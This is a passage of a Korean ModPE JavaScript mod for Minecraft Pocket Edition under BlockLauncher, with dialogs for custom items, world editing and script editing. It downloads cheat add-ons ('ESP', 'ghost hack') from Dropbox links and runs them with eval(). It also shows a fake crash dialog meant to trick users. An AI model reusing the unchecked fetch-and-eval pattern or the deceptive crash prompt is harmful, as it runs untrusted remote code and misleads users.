Dark.showDialog("텍스쳐명&텍스쳐 데미지 목록", "items-opaque.png와 순서가 같습니다. abc순(시계, 나침반 제외)이며, (텍스쳐명, 텍스쳐 데미지)입니다.\n\napple, 0\napple_golden, 0\narrow, 0\naxe, 0~4\nbed, 0\nbeef_cooked, 0\nbeef_raw, 0\nblaze_powder, 0\nblaze_rod, 0\nboat, 0\nbone, 0\nbook_enchanted, 0\nbook_normal, 0\nbook_writable, 0\nbook_written, 0\nboots, 0~4\nbowl, 0\nbow_pulling, 0~2\nbow_standby, 0\nbread, 0\nbrewing_stand, 0\nbrick, 0\nbucket, 0~3\ncake, 0\ncarrot, 0\ncarrot_golden, 0\ncarrot_on_a_stick, 0\nbeetroot, 0\ncauldron, 0\ncharcoal, 0\nchestplate, 0~4\nchicken_cooked, 0\nchicken_raw, 0\nclay_ball, 0\ncoal, 0\ncomparator, 0\ncookie, 0\ndiamond, 0\ndiamond_horse_armor, 0\ndoor_iron, 0\ndoor_wood, 0\ndye_powder, 0~15\negg, 0\nemerald, 0\nempty_armor_slot_boots, 0\nempty_armor_slot_chestplate, 0\nempty_armor_slot_helmet, 0\nempty_armor_slot_leggings, 0\nender_eye, 0\nender_pearl, 0\nexperience_bottle, 0\nfeather, 0\nfireball, 0\nfireworks, 0\nfireworks_charge, 0\nfireworks_charge_overlay, 0\nfishing_rod, 0\nfish_raw, 0\nfish_cooked, 0\nflint, 0\nflint_and_steel, 0\nflower_pot, 0\nghast_tear, 0\nglowstone_dust, 0\ngold_horse_armor, 0\ngold_ingot, 0\ngold_nugget, 0\ngunpowder, 0\nhelmet, 0~4\nhoe, 0~4\nhopper, 0\niron_horse_armor, 0\niron_ingot, 0\nitem_frame, 0\nlead, 0\nleather, 0\nleggings, 0~4\nmagma_cream, 0\nmap_empty, 0\nmap_filled, 0\nmelon, 0\nmelon_speckled, 0\nminecart_chest, 0\nminecart_furnace, 0\nminecart_hopper, 0\nminecart_normal, 0\nminecart_tnt, 0\nmushroom_stew, 0\nbeetroot_soup, 0\nname_tag, 0\nnetherbrick, 0\nnether_star, 0\nnether_wart, 0\npainting, 0\npaper, 0\npickaxe, 0~4\nporkchop_cooked, 0\nporkchop_raw, 0\npotato, 0\npotato_baked, 0\npotato_poisonous, 0\npotion_bottle_drinkable, 0\npotion_bottle_empty, 0\npotion_bottle_splash, 0\npotion_overlay, 0\npumpkin_pie, 0\nquartz, 0\nquiver, 0\nrecord_11, 0\nrecord_13, 0\nrecord_blocks, 0\nrecord_cat, 0\nrecord_chirp, 0\nrecord_far, 0\nrecord_mall, 0\nrecord_mellohi, 0\nrecord_stal, 0\nrecord_strad, 0\nrecord_wait, 0\nrecord_ward, 0\nredstone_dust, 0\nreeds, 0\nrepeater, 0\nrotten_flesh, 0\nruby, 0\nsaddle, 0\nseeds_melon, 0\nseeds_pumpkin, 0\nseeds_wheat, 0\nseeds_beetroot, 0\nshears, 0\nshovel, 0~4\nsign, 0\nskull_creeper, 0\nskull_skeleton, 0\nskull_steve, 0\nskull_wither, 0\nskull_zombie, 0\nslimeball, 0\nsnowball, 0\nspawn_egg, 0~22\nspider_eye, 0\nspider_eye_fermented, 0\nstick, 0\nstring, 0\nsugar, 0\nsword, 0~4\nwheat, 0\nclock_item, 0\ncompass_item\n");
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showItemTexture(true);
}
});
button[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
showItemTexture(false);
return true;
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectLauncher();
}
});
button[3].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
selectLauncher(true);
return true;
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
fake = true;
Dark.toast("추가 기능을 닫으시면 가짜 크래시가 뜹니다.");
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.selectBuilding(false);
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
h.tf = true;
Dark.toast("터치하시면 소환됩니다.");
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
setTileManager();
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
particleHelper();
}
});
button[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addItemInventory(302, 1, 0);
addItemInventory(303, 1, 0);
addItemInventory(304, 1, 0);
addItemInventory(305, 1, 0);
addItemInventory(267, 1, 0);
addItemInventory(354, 30, 0);
addItemInventory(320, 30, 0);
addItemInventory(306, 1, 0);
addItemInventory(307, 1, 0);
addItemInventory(308, 1, 0);
addItemInventory(309, 1, 0);
if(mcpev2){
addItemInventory(373, 30, 28);
addItemInventory(373, 15, 30);
}
Dark.toast("지급되었습니다.");
}
});
button[10].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectScriptType();
}
});
button[11].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loadAppList(true);
}
});
button[11].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
loadAppList(false);
return true;
}
});
button[12].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
makerSummon = true;
Dark.toast("터치하시면 소환됩니다.");
}
});
for(var n in menus)
layout.addView(button[n]);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("추가 기능");
dialog.setNegativeButton("닫기", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(fake){
ModPE.leaveGame();
fakeCrash();
fake = false;
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function addNewItem(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var tf = false;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var hand = new android.widget.CheckBox(ctx);
hand.setText("도구처럼 설정");
hand.setChecked(false);
hand.setTextColor(white);
hand.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
tf = onoff;
}
}));
layout.addView(hand);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("새로 추가할 아이템의 코드를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("텍스쳐명 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("새로 추가할 아이템의 텍스쳐 이름을 입력하세요...");
loc4.setTextColor(white);
loc5.setText("텍스쳐 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("새로 추가할 아이템의 텍스쳐 데미지를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc7.setText("아이템 이름 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("새로 추가할 아이템의 이름을 입력하세요...");
loc8.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("커스텀 아이템 추가");
dialog.setNegativeButton("취소", null);
dialog.setNeutralButton("음식으로 추가", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
addNewFoodItem();
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
ModPE.setItem(loc2.getText(), loc4.getText()+"", loc6.getText(), loc8.getText()+"");
Item.setHandEquipped(loc2.getText(), tf);
Dark.toast(loc8.getText()+"(이)라는 아이템이 추가되었습니다.\n(아이템 아이디 : "+loc2.getText()+")");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function addNewFoodItem(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
var loc9 = new android.widget.TextView(ctx);
var loc10 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("새로 추가할 음식의 아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("텍스쳐명 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("새로 추가할 음식의 텍스쳐 이름을 입력하세요...");
loc4.setTextColor(white);
loc5.setText("텍스쳐 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("새로 추가할 음식의 텍스쳐 데미지를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc7.setText("회복량 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("새로 추가할 음식의 회복량을 입력하세요(음수 포함)...");
loc8.setTextColor(white);
loc8.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
loc9.setText("음식 이름 : ");
loc9.setTextSize(18);
loc9.setTextColor(white);
loc10.setHint("새로 추가할 음식의 이름을 입력하세요...");
loc10.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
layout.addView(loc9);
layout.addView(loc10);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("커스텀 음식 추가");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
ModPE.setFoodItem(loc2.getText(), loc4.getText()+"", loc6.getText(), loc8.getText(), loc10.getText()+"");
Dark.toast(loc10.getText()+"(이)라는 음식이 추가되었습니다.\n(아이템 아이디 : "+loc2.getText()+")");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function blockEventHook(x, y, z, t, d){
if(showChest)
darkMessage("창고 위치 : "+x+", "+y+", "+z);
if(loadChest){
var i, a, it;
var data = [];
for(var n=0;n<27;n++){
i = Level.getChestSlot(x, y, z, n);
a = Level.getChestSlotCount(x, y, z, n);
it = Level.getChestSlotData(x, y, z, n);
data.push([i, a, it]);
}
loadChestData.push([[x, y, z], data]);
loadChestCount++;
loadChest2 = true;
}


}


function selectLauncher(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var nn = 0;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var radios = new android.widget.RadioGroup(ctx);
var radio1 = new android.widget.RadioButton(ctx);
radio1.setText("블록 런처");
radio1.setTextColor(white);
radio1.setId(1);
var radio2 = new android.widget.RadioButton(ctx);
radio2.setText("블록 런처 프로");
radio2.setTextColor(white);
radio2.setId(2);
radios.addView(radio1);
radios.addView(radio2);
layout.addView(radios);
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
nn = checkedId;
}
}));
var txt = new android.widget.TextView(ctx);
if(tf) txt.setText("루팅을 하지 않은 경우, 블록 런처에서 블록 런처 프로에 적용된 모드들을 확인하거나 그 반대의 경우(블록 런처 프로에서 블록 런처에 적용된 모드들을 확인)는 불가능합니다.");
else txt.setText("루팅을 하지 않은 경우, 블록 런처에서 블록 런처 프로에 적용된 스크립트들을 확인하거나 그 반대의 경우(블록 런처 프로에서 블록 런처에 적용된 스크립트들을 확인)는 불가능합니다.");
txt.setTextSize(17);
txt.setTextColor(white);
layout.addView(txt);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("런처 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(tf) showModList(nn);
else showScriptList(nn);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showScriptList(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(nn==1) var path = "/data/data/net.zhuoweizhang.mcpelauncher/app_modscripts";
if(nn==2) var path = "/data/data/net.zhuoweizhang.mcpelauncher.pro/app_modscripts";
var dir = new java.io.File(path).list().sort();
dialog.setItems(dir, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
Dark.toast("스크립트가 너무 긴 경우 읽을 수 없습니다(팅김).");
openScriptEditor(dir[w], readScript(dir[w], nn), nn);
}
}));
dialog.setTitle("적용된 스크립트 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("루팅되어있지 않습니다.");
return;
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openScriptEditor(name, string, nn){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
var text = new android.widget.EditText(ctx);
text.setText(string);
text.setTextColor(white);
text.setTextSize(17);
layout.addView(text);
dialog.setTitle(name);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
saveScript(name, text.getText().toString(), nn);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function saveScript(name, msg, nn){
try{
if(nn==1) var path = "/data/data/net.zhuoweizhang.mcpelauncher/app_modscripts";
if(nn==2) var path = "/data/data/net.zhuoweizhang.mcpelauncher.pro/app_modscripts";
var file = new java.io.File(path+"/"+name);
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String(msg);
fos.write(str.getBytes());
fos.close();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function readScript(name, nn){
try{
if(nn==1) var path = "/data/data/net.zhuoweizhang.mcpelauncher/app_modscripts";
if(nn==2) var path = "/data/data/net.zhuoweizhang.mcpelauncher.pro/app_modscripts";
var file = new java.io.File(path+"/"+name);
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function fakeCrash(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx);
dialog.setMessage("BlockLauncher에서 크래시를 감지하였습니다. 나중의 크래시를 방지하기 위해 안전 모드를 활성화 합니다.");
dialog.setNegativeButton("계속", null);
dialog.setPositiveButton("안전모드 끄기", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.toast("한명 낚았다. 훗");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeBuilding(x, y, z){
var names = ["wood", "wood2", "stone", "woodStone", "netherReactor", "EnerReactor", "EnderPortal"];
if(Dark.readAddOn("buildings/"+names[buildingType])=="")
Dark.toast("파일이 없습니다.");
else
eval(Dark.readAddOn("buildings/"+names[buildingType]));
}


function particleShot(){
var px, py, pz, yaw, sin, cos;
px = Entity.getX(nox);
py = Entity.getY(nox)+0.3;
pz = Entity.getZ(nox);
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<40;gun++)
Level.addParticle(ParticleType.flame, px+gun*sin/2, py, pz+gun*cos/2, 0, 0, 0, 3);
}


function pushMaker(){
var yaw, sin, cos;
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
Entity.setVelX(nox, 3.2*sin);
Entity.setVelY(nox, 0.7);
Entity.setVelZ(nox, 3.2*cos);
}


function giveDiamonds(){
var px, py, pz, yaw, sin, cos;
px = Entity.getX(nox);
py = Entity.getY(nox)+0.3;
pz = Entity.getZ(nox);
yaw = Math.floor(Entity.getYaw(nox));
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
Level.dropItem(px+2.3*sin, py, pz+2.3*cos, 0, 264, 3, 0);
dtm("다이아몬드가 필요한가?");
}


function antiTouch(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(anT==0){
anT = 5;
}
else if(anT>0){
anT = -5;
}
else{
menu.dismiss();
Dark.toast("풀렸습니다.");
}
}
});
menu.setContentView(layout);
menu.setFocusable(true);
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeBtnW(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
w.btn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("W");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(w.menu==null) worldEditPlus(true);
else worldEditPlus(false);
}
}));
setDragListener(w.btn, button, 0);
layout.addView(button);
w.btn.setContentView(layout);
w.btn.setWidth(dip2px(ctx, 25));
w.btn.setHeight(dip2px(ctx, 25));
w.btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(Dark.read("wBtnX")=="")
w.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, dip2px(ctx, 25));
else
w.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("wBtnX"), Dark.read("wBtnY"));
}
else{
if(w.btn!=null){
w.btn.dismiss();
w.btn = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function worldEditPlus(tf){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
return;
}
if(Dark.readAddOn("worldEdit")!="")
eval(Dark.readAddOn("worldEdit"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function inputBlockId(type){
if(type==4) replaceDialog(true);
else if(type==5) procCmd("snow");
else if(type==6) procCmd("freeze");
else if(type==7) procCmd("no tree");
else if(type==8) procCmd("no water");
else if(type==9) procCmd("copy");
else if(type==10) procCmd("paste");
else{
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요");
loc4.setTextColor(white);
loc4.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
if(type>=19){
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc5.setText("거리 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("거리를 입력하세요");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc5);
layout.addView(loc6);
}
else if(type>=13){
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc5.setText("반지름 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("반지름를 입력하세요");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc5);
layout.addView(loc6);
if(type==15){
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
loc7.setText("높이 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("높이를 입력하세요");
loc8.setTextColor(white);
loc8.setInputType(number);
layout.addView(loc7);
layout.addView(loc8);
}
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
if(type==3) dialog.setTitle("채우기");
if(type==11) dialog.setTitle("벽(내부 지형 삭제)");
if(type==12) dialog.setTitle("벽(내부 지형 유지)");
if(type==13) dialog.setTitle("원");
if(type==14) dialog.setTitle("찬 원");
if(type==15) dialog.setTitle("원기둥");
if(type==16) dialog.setTitle("구");
if(type==17) dialog.setTitle("반구");
if(type==18) dialog.setTitle("찬 구");
if(type==19) dialog.setTitle("직선");
if(type==20) dialog.setTitle("직선(y축 포함)");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(type==3) procCmd("set "+loc2.getText()+" "+loc4.getText());
if(type==11) procCmd("wall "+loc2.getText()+" "+loc4.getText());
if(type==12) procCmd("wall2 "+loc2.getText()+" "+loc4.getText());
if(type==13) procCmd("circle "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==14) procCmd("circle2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==15) procCmd("cylin "+loc6.getText()+" "+loc8.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==16) procCmd("sphere "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==17) procCmd("sphereh "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==18) procCmd("sphere2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==19) procCmd("line "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
if(type==20) procCmd("line2 "+loc6.getText()+" "+loc2.getText()+" "+loc4.getText());
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}
}


function setTileManager(){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
}
else if(!sm.tf){
Dark.toast("setTile 메니저가 비활성화 되어있습니다.");
}
else{
if(Dark.readAddOn("setTileManager")!="")
eval(Dark.readAddOn("setTileManager"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
}


function showSetTiles(tf){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var text = new android.widget.TextView(ctx);
if(tf) text.setText(particleString);
else text.setText(setTileString);
text.setTextColor(white);
text.setTextSize(17);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
layout.addView(text);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
if(tf) dialog.setTitle("파티클 도우미");
else dialog.setTitle("setTile 메니저");
dialog.setNegativeButton("닫기",null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(tf) selectDir(sdcard, 3);
else selectDir(sdcard, 2);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function particleHelper(){
if(!w.tf){
Dark.toast("월드 에딧이 비활성화 되어있습니다.");
}
else if(!sm.tf){
Dark.toast("setTile 메니저가 비활성화 되어있습니다.");
}
else{
if(Dark.readAddOn("particleHelper")!="")
eval(Dark.readAddOn("particleHelper"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
}


function selectAddOn(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var button = new Array();
var menus = ["Smart Moving", "고급 테러", "건물 소환", "월드 에딧", "Dark Cheater ESP", "setTile 매니저", "파티클 도우미", "고스트핵", "Fire Editor"];
for(var n in menus){
button[n] = new android.widget.Button(ctx);
button[n].setText(menus[n]);
}
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/qr0b20lej5gixcw\/smartMoving.txt?dl=1", "smartMoving");
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.toast("다운받을 수 없습니다.");
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.selectBuilding(true);
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/b48w9yggc6f3krm\/worldEdit.txt?dl=1", "worldEdit");
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/onxpo3hnryh8inl\/ESP.txt?dl=1", "ESP");
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/p2hi8720t8y9m6b\/setTileManager.txt?dl=1", "setTileManager");
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/6h4t8qb7s032ixa\/particleHelper.txt?dl=1", "particleHelper");
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/fetotc0319bxumb\/ghostHack.txt?dl=1", "ghostHack");
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/gko5prz81u52lvg\/fireEditor.txt?dl=1", "fireEditor");
}
});
for(var n in menus)
layout.addView(button[n]);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("추가 파일 다운로드");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectScriptType(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var events = ["새로 만들기", "불러오기"];
dialog.setItems(events, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(w==0) selectEventFunc();
if(w==1) inputScriptSorce(true);
}
}));
dialog.setTitle("스크립트 추가 - 작업 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectEventFunc(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var events = ["useItem", "attackHook", "modTick", "procCmd", "newLevel", "leaveGame", "deathHook", "entityAddedHook"];
dialog.setItems(events, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
Dark.save("scriptType", w);
inputScriptSorce(false);
}
}));
dialog.setTitle("스크립트 추가 - 이벤트 함수 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputScriptSorce(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var sorce = new android.widget.EditText(ctx);
sorce.setHint("소스를 입력하세요...");
sorce.setGravity(android.view.Gravity.TOP);
if(tf) sorce.setText(Dark.read("scriptAdded"));
layout.addView(sorce);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("스크립트 추가 - 소스 내용 입력");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("scriptAdded", sorce.getText().toString());
